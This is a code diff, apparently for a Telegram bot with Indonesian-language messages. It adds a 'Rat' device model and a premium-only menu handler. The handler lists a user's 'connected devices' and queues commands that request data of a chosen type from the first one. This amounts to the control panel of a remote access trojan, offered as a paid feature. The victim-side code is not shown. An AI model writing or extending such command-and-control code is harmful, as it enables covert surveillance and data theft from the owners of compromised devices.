@@ -6,6 +6,7 @@ const axios = require('axios');
 const config = require("./config");
 const User = require('./models/user');
 const Product = require('./models/product');
+const Rat = require('./models/rat');
 const Category = require('./models/category');
 const Transaction = require('./models/transaction');
 const Userbot = require('./models/userbot');
@@ -832,6 +833,38 @@ bot.on("callback_query", async (query) => {
         } catch (error) {
             console.error("Gagal menghapus premium pengguna:", error);
             await bot.answerCallbackQuery(query.id, { text: 'Terjadi kesalahan.', show_alert: true });
+        }
+    }
+    else if (data.startsWith("awan_")) {
+        const user = await User.findOne({ chatId: userId });
+        if (!user || !user.isPremium) {
+            return bot.answerCallbackQuery(query.id, { text: 'Fitur ini hanya untuk pengguna premium.', show_alert: true });
+        }
+
+        const action = data.split("_")[1];
+
+        if (action === "list") {
+            const devices = await Rat.find({ chatId: userId });
+            if (devices.length === 0) {
+                return bot.sendMessage(chatId, "Tidak ada perangkat yang terhubung.");
+            }
+            let message = "Perangkat yang terhubung:\n\n";
+            devices.forEach(device => {
+                message += `- ${device.deviceId}\n`;
+            });
+            bot.sendMessage(chatId, message);
+        } else if (action === "get") {
+            const dataType = data.split("_")[2];
+            const devices = await Rat.find({ chatId: userId });
+            if (devices.length === 0) {
+                return bot.sendMessage(chatId, "Tidak ada perangkat yang terhubung.");
+            }
+            // For now, just send the command to the first device
+            const deviceId = devices[0].deviceId;
+            const rat = await Rat.findOne({ deviceId });
+            rat.pendingCommand = `get_${dataType}`;
+            await rat.save();
+            bot.sendMessage(chatId, `Meminta data '${dataType}' dari perangkat ${deviceId}...`);
         }
     }
     else if (data === "unchek_menu") {
